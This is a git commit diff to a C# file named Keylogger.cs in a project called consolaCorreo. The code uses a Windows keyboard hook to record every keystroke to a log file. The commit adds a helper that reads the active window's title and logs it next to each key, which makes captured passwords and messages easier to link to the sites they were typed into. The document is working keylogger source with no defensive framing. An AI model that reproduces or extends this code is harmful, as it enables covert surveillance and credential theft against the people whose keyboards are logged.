0cbdba0aeec4f6ed1324b7168235866eb6e57bdd
lquenta <lquenta@gmail.com>
2017-02-24 12:58:29 -0400

    cambio

--- consolaCorreo/Keylogger.cs
+++ consolaCorreo/Keylogger.cs
@@ -36,8 +36,11 @@ namespace consolaCorreo
             {
                 int vkCode = Marshal.ReadInt32(lParam);
                 Console.WriteLine((Keys)vkCode);
+
                 StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
-                sw.Write((Keys)vkCode);
+                sw.WriteLine("ventana: "+ GetActiveWindowTitle());
+                
+                sw.WriteLine((Keys)vkCode);
                 sw.Close();
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
@@ -52,6 +55,29 @@ namespace consolaCorreo
             }
         }
         //These Dll's will handle the hooks. Yaaar mateys!
+
+
+        [DllImport("user32.dll")]
+        static extern IntPtr GetForegroundWindow();
+
+
+        [DllImport("user32.dll")]
+        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
+
+        private static string GetActiveWindowTitle()
+        {
+            const int nChars = 256;
+            StringBuilder Buff = new StringBuilder(nChars);
+            IntPtr handle = GetForegroundWindow();
+
+            if (GetWindowText(handle, Buff, nChars) > 0)
+            {
+             return Buff.ToString();
+            }
+          return null;
+        }
+
+
 
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         public static extern IntPtr SetWindowsHookEx(int idHook,
